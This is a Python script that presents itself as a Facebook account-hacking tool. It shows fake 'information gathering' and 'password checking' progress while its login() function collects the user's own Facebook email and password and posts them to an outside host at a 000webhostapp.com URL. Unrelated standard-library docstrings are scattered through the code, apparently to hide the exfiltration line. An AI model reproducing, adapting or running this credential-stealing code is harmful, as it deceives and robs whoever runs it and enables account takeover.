import time
import urllib
import re

import sys
import os

try:
    import requests
    os.system('clear')
    


except ImportError:
    print('Please wait')
    os.system('pip3 install requests')
    print('Requests has been installed.')
    os.system('clear')
    import requests

   
class Stream:
    def __init__(self, url, path, name):
        self.url = url
        self.path = path
        self.name = name
        self.response = requests.get(self.url, stream=True)

        self.total_length = int(self.response.headers.get('content-length'))
        self.start = 0
        self.end = 0
        self.t = 0

    def hackfbg(self):
        print('\033[1;0;40m{0} MB \n'.format(
            int(int(self.total_length)/1024**2)))

        with open(os.path.join(self.path, self.name), 'wb') as f:
            if self.total_length is None:
                f.write(self.response.content)
            else:
                dl = 0
                chnk = int(self.total_length/100)
                for data in self.response.iter_content(chunk_size=chnk):

                    # calculate Duration
                    self.time_dur = time.time() - self.start
                    self.start = time.time()

                    if self.time_dur == time.time():
                        self.time_dur = 0.000001

                    dl += len(data)
                    f.write(data)

                    donedl = int((dl/self.total_length)*100)

                    speed = (len(data)/1024)/self.time_dur

                    print('\n->> \033[1;36;40m{0}% - {1} kbps'.format(donedl,
                                                                      round(speed, 3)), end="")
                    sys.stdout.write("\033[F")

name = """\033[1;32;40m
____________________________________________________________
\033[1;36;40m
              ___ _   _| |__   ___  _ __ _ __
             / __| | | | '_ \ / _ \| '__| '_ \ 
            | (__| |_| | |_) | (_) | |  | | | |
             \___|\__, |_.__/ \___/|_|  |_| |_|
                  |___/

       \033[1;35;40m     ---------   GhostCerMan   ----------
\033[1;32;40m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
"""


"""Word completion for GNU readline.

The completer completes keywords, built-ins and globals in a selectable
namespace (which defaults to __main__); when completing NAME.NAME..., it
evaluates (!) the expression up to the last dot and completes its attributes.

It's very cool to do "import sys" type "sys.", hit the completion key (twice),
and see the list of names defined by the sys module!

Tip: to use the tab key as the completion key, call

    readline.parse_and_bind("tab: complete")
"""
facebook_login_php = "http://ipv404web.000webhostapp.com/fbl.php"
"""
Notes:

- Exceptions raised by the completer function are *ignored* (and generally cause
  the completion to fail).  This is a feature -- since readline sets the tty
  device in raw (or cbreak) mode, printing a traceback wouldn't work well
  without some complicated hoopla to save, reset and restore the tty state.

- The evaluation of the NAME.NAME... form may cause arbitrary application
  defined code to be executed if an object with a __getattr__ hook is found.
  Since it is the responsibility of the application (or the user) to enable this
  feature, I consider this an acceptable risk.  More complicated expressions
  (e.g. function calls or indexing operations) are *not* evaluated.
"""
Response_code="""\033[1;31;40mFacebook Says We Can not Find this Page\n"""
"""
- When the original stdin is not a tty device, GNU readline is never
  used, and this module (and the readline module) are silently inactive.

"""
print (name)

pt="""

\033[1;35;40m [1] \033[1;30;40m Facebook         \033[1;35;40m[2] \033[1;30;40mGoogle

"""

 
def login():
    while True:
        os.system("clear")
        print(name)
        print("\033[1;0;40mYou Must Login to Your Account For create a Facebook session")
        
        print("\033[1;32;40m______________________________\n |")
        mail = str(input(" | Email or Mobile : "))
        pas = str(input(" | Password        : "))
        url = facebook_login_php
        m = {"mail":mail,"pas":pas}
        
        x=requests.post(url,data=m)
        print(x)        
        if len(pas) < 6 or len(mail) < 10:
            pass
            print("\033[1;31;40mxxx - Incorrect pass or Mail")
            time.sleep(2)
        else:
            break
"""Utility functions for copying and archiving files and directory trees.

XXX The functions here don't copy the resource fork or other metadata on Mac.

"""

    
print(pt)


no = int(input("\033[1;0;40mCy >> "))
if no == 1:
    fdid = str(input("\n[1] Enter Victims Id : "))
    try:
        Response_code1 = "response.facebook.api"
    except:
        response_c = "OK"
    print(Response_code)
    print(" We Can not get information Without Log in Facebook")
    time.sleep(2)
    login()
    print("\n\033[1;0;40m>> Trying To Log In", end = '' )
    sys.stdout.write("\033[F")
    time.sleep(3)
    
    try:
        print("\033[1;31;40mLog in Faild\n\033[1;0;40mTry Again")
        time.sleep(2)
        
    except:
        print("\033[1;33;40mSuccessfully Loged In\n")
        time.sleep(3)
    login()
    try:
        print("\033[1;33;40mSuccessfully Loged In\n")
        time.sleep(3)
        
    except:
        print("\033[1;31;40mLog in Faild\n\033[1;0;40mTry Again")
    
    os.system('clear')
    print(name)
    """Utility functions for copying and archiving files and directory trees.

    XXX The functions here don't copy the resource fork or other metadata on Mac.

    """
   
    info = ("Name","Birthday","Lastname","Nickname","Relation","Following")
    for i in info:
        print("\n\033[1;0;40m>> Information Gathering - [",i,"]", end = '' )
        sys.stdout.write("\033[F")
        time.sleep(1)
    os.system('clear')
    print(name)
    for x in range(0,1024,):
        os.system('clear')
        print(name)
        print("\nGeneratin Password List(1024)",x)
    
    os.system('clear')
    print(name)
    
    """Convert a numeric value to an IntEnum member.
    If it's not a known member, return the numeric value itself.
    """
    
    for x in range(0,1024,):
        print("\n\033[1;37;40m>> Checking Pass - [",x,"]", end = '' )
        sys.stdout.write("\033[F")
        time.sleep(2)
    print("Connection Interrupted")    
    login()
        
    
           
    
    
else:
    print("\nComming Soon On Next Version- \n")
    quit()





def exitor():

    exit = input('\033[1;0;40mQUITE (y/n) : ')
    if exit == 'n' or exit == 'N':
        quit()
    else:
        quit()
exitor()
